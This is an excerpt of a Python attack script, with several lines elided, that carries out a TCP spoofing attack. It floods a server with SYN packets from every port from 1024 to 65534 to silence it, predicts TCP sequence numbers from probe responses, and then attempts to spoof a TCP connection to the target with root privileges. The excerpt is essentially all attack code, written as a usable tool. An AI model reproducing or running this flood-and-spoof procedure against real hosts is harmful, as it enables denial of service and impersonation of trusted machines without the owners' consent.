...
# Attempts to silence the server by sending SYN Packets to the server, will send exactly 64,511 packets and if it doesn't succeed it will end
def SynAttack(src, target):
	for sport in range(1024, 65535):
		...
		send(pkt)				# Will continously send the SYN packet to silence the server
...
def callTSN(target):
	...
	for x in range(1, 5):			
		...
		PredictSequence = ans.getlayer(TCP).seq		# May or may not work, depending on the enviroment run on
		diffSeq = PredictSequence - repNum		# Will subtract two TCP sequence numbers to find the difference
...
def main():
	if not os.geteuid() == 0:				# Requires the program to have root privilege
	...
	SynAttack(synSpoof, srcSpoof)				# Will call the SYNAttack function
	print '\t[+] Calculating correct TCP Sequence Number'
	PredictSequence = callTSN(target) + 1				# Will call the PredictSequence function
	print '\t[+] Attempting To Spoof TCP Connection'
	AttemptSpoof(srcSpoof, target, PredictSequence)		# Will call the call the AttemptSpoof function
	print '\t[+] Task Complete'
